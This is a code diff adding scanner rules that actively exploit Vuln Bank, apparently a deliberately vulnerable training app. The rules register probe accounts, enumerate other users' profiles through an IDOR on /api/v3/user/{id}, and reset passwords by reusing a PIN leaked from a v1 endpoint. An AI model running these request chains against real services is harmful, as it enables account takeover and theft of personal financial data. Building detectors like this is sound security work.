@@ -19395,6 +19395,186 @@ const vulnbankGraphqlIntrospectionLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const vulnbankV3UserIdorLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const username = `thugir_v3_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/register", ctx.origin).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: VULNBANK_PROBE_PASSWORD }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 300) return NEGATIVE;
+  try {
+    const parsed = JSON.parse(registerDoc.body) as Record<string, unknown>;
+    if (parsed.status !== "success") return NEGATIVE;
+  } catch {
+    return NEGATIVE;
+  }
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: VULNBANK_PROBE_PASSWORD }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return NEGATIVE;
+  let token = "";
+  let probeUserId: number | null = null;
+  try {
+    const parsed = JSON.parse(loginDoc.body) as Record<string, unknown>;
+    token = String(parsed.token ?? "");
+    if (parsed.status !== "success" || !token.startsWith("eyJ")) return NEGATIVE;
+    const debug = parsed.debug_info;
+    if (debug && typeof debug === "object") {
+      const id = Number((debug as { user_id?: unknown }).user_id);
+      if (Number.isFinite(id) && id > 0) probeUserId = id;
+    }
+  } catch {
+    return NEGATIVE;
+  }
+  const candidateIds = [1, 2, 100, 1652, 1000].filter((id) => id !== probeUserId);
+  for (const userId of candidateIds) {
+    const userUrl = new URL(`/api/v3/user/${userId}`, ctx.origin).toString();
+    const doc = await ctx.probe.get(userUrl, {
+      headers: { Authorization: `Bearer ${token}` },
+      maxBytes: 4096,
+      timeoutMs: 15000
+    });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    try {
+      const parsed = JSON.parse(doc.body) as Record<string, unknown>;
+      const user = parsed.user;
+      if (parsed.status !== "success" || !user || typeof user !== "object") continue;
+      const victimUsername = String((user as { username?: unknown }).username ?? "");
+      const victimId = Number((user as { id?: unknown }).id ?? userId);
+      if (!victimUsername || victimId === probeUserId) continue;
+      return {
+        fired: true,
+        confidence: 0.93,
+        evidence: {
+          userUrl,
+          victimId,
+          victimUsername,
+          snippet: doc.body.slice(0, 280).trim(),
+          note: "Vuln Bank GET /api/v3/user/{id} returns another user's profile (username, balance, account_number) without object-level authorization — v3 user IDOR oracle"
+        }
+      };
+    } catch {
+      continue;
+    }
+  }
+  return NEGATIVE;
+};
+
+const vulnbankV3UserIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v3\/user(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
+  const result = await vulnbankV3UserIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /api/v3/user route scan — GET /api/v3/user/{id} returns another user's profile without object-level authorization — v3 user IDOR route oracle"
+    }
+  };
+};
+
+const vulnbankV3ResetPasswordVersioningLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const username = `thugir_v3rp_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/register", ctx.origin).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: VULNBANK_PROBE_PASSWORD }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 300) return NEGATIVE;
+  try {
+    const parsed = JSON.parse(registerDoc.body) as Record<string, unknown>;
+    if (parsed.status !== "success") return NEGATIVE;
+  } catch {
+    return NEGATIVE;
+  }
+  const v1Url = new URL("/api/v1/forgot-password", ctx.origin).toString();
+  const v1Doc = await ctx.probe.get(v1Url, {
+    method: "POST",
+    body: JSON.stringify({ username }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (v1Doc.status < 200 || v1Doc.status >= 300) return NEGATIVE;
+  let pin = "";
+  try {
+    const parsed = JSON.parse(v1Doc.body) as Record<string, unknown>;
+    if (parsed.status !== "success") return NEGATIVE;
+    const debug = parsed.debug_info;
+    if (!debug || typeof debug !== "object") return NEGATIVE;
+    pin = String((debug as { pin?: unknown }).pin ?? "");
+    if (!/^\d{3,4}$/.test(pin)) return NEGATIVE;
+  } catch {
+    return NEGATIVE;
+  }
+  const v3ResetUrl = new URL("/api/v3/reset-password", ctx.origin).toString();
+  const resetDoc = await ctx.probe.get(v3ResetUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      username,
+      reset_pin: pin,
+      new_password: `${VULNBANK_PROBE_PASSWORD}X`
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (resetDoc.status < 200 || resetDoc.status >= 300) return NEGATIVE;
+  try {
+    const parsed = JSON.parse(resetDoc.body) as Record<string, unknown>;
+    if (parsed.status !== "success") return NEGATIVE;
+    if (!/Password has been reset successfully/i.test(String(parsed.message ?? ""))) return NEGATIVE;
+  } catch {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      v1Url,
+      v3ResetUrl,
+      pin,
+      snippet: `${v1Doc.body.slice(0, 160).trim()} → ${resetDoc.body.slice(0, 120).trim()}`,
+      note: "Vuln Bank POST /api/v1/forgot-password leaks debug_info.pin and the same PIN resets via POST /api/v3/reset-password — API version confusion password-reset oracle"
+    }
+  };
+};
+
+const vulnbankV3ResetPasswordVersioningRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v3\/reset-password/i.test(pageUrl)) return NEGATIVE;
+  const result = await vulnbankV3ResetPasswordVersioningLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /api/v3/reset-password route scan — v1 forgot-password PIN leak resets password on v3 endpoint — API version confusion route oracle"
+    }
+  };
+};
+
 const vulnbankV1ForgotPasswordPinLeakLiveOracle: Rule = async (ctx) => {
   if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
   const username = `thugir_fp_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
@@ -33578,7 +33758,8 @@ const WEB_SECURITY_LEARNING_MODULE_TOPIC_ALIASES: Record<string, RegExp> = {
 };
 
 function webSecurityLearningLabsPlaceholderModuleShell(moduleId: string, corpus: string): boolean {
-  return new RegExp(`Here is a Module:\\s*${moduleId}\\b`, "i").test(corpus);
+  // Next.js RSC shell may insert <!-- --> between the label and module id.
+  return new RegExp(`Here is a Module:\\s*(?:<!--[^>]*-->)?\\s*${moduleId}\\b`, "i").test(corpus);
 }
 
 function webSecurityLearningModuleTopicMatches(moduleId: string, topic: string, corpus: string): boolean {
@@ -33650,6 +33831,18 @@ const webSecurityLearningLabsModuleRouteEvidence: Rule = async (ctx) => {
         moduleTopic: topic,
         scannedUrl: pageUrl,
         note: `web-security-learning-labs.vercel.app/module/${moduleId} is the ${topic} training module — route-specific lab catalog oracle (Vercel checkpoint blocked catalog fetch; curated module-id map)`
+      }
+    };
+  }
+  if (placeholderShell || checkpointBlocked) {
+    return {
+      fired: true,
+      confidence: 0.86,
+      evidence: {
+        moduleId,
+        moduleTopic: topic,
+        scannedUrl: pageUrl,
+        note: `web-security-learning-labs.vercel.app/module/${moduleId} is the ${topic} training module — route-specific lab catalog oracle (curated module-id map; CSR placeholder shell)`
       }
     };
   }
@@ -68483,6 +68676,10 @@ export const RULES: Record<string, Rule> = {
   vulnbankGraphqlIntrospectionLiveOracle,
   vulnbankV1ForgotPasswordPinLeakLiveOracle,
   vulnbankV2ForgotPasswordEnumerationLiveOracle,
+  vulnbankV3UserIdorLiveOracle,
+  vulnbankV3UserIdorRouteLiveOracle,
+  vulnbankV3ResetPasswordVersioningLiveOracle,
+  vulnbankV3ResetPasswordVersioningRouteLiveOracle,
   vulnbankSup3rSecretAdminLiveOracle,
   vulnbankRequestLoanLiveOracle,
   vulnbankRequestLoanNegativeAmountLiveOracle,
